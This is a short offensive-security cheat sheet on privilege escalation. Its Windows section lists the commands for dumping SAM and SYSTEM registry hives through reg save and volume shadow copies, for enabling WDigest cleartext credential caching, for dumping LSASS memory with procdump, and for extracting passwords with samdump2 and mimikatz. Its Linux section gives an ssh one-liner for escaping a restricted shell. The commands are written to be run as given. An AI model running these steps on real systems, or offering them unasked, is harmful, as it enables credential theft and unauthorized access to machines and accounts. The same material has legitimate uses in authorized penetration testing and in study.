# Privilege Escalation

## Windows
> [LOLBAS](https://lolbas-project.github.io/)

### Potato Attacks

### Print Spoofer
> [PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 | itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

### Pass the Hash

#### Hash Source

##### SAM (registry)
> only local account

- Export
    - reg

        ```
        cmd> reg save HKLM\SAM .\sam.reg
        cmd> reg save HKLM\SYSTEM .\system.reg
        ```

    - vssadmin

        ```
        cmd> vssadmin create shadow
        cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\sam.reg
        cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .\system.reg
        ```

- Show

    ```
    sh> samdump2 system sam
    ```

##### LSASS (memory)
> only logon account

- Prerequisite

    ```
    cmd> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
    ```

- Export

    ```
    cmd> procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```

- Show
    - From dump file

        ```
        mimikatz> sekurlsa::minidump lsass.dmp
        mimikatz> sekurlsa::logonPasswords
        ```
    
    - Live

        ```
        mimikatz> privilege::debug
        mimikatz> sekurlsa::logonpasswords
        ```


## Linux
> [GTFOBins](https://gtfobins.github.io/)

### Restricted Shell
> [Escape from Restricted Shells | 0xffsec](https://0xffsec.com/handbook/shells/restricted-shells/)

- `$ ssh -t localhost "bash --noprofile"`
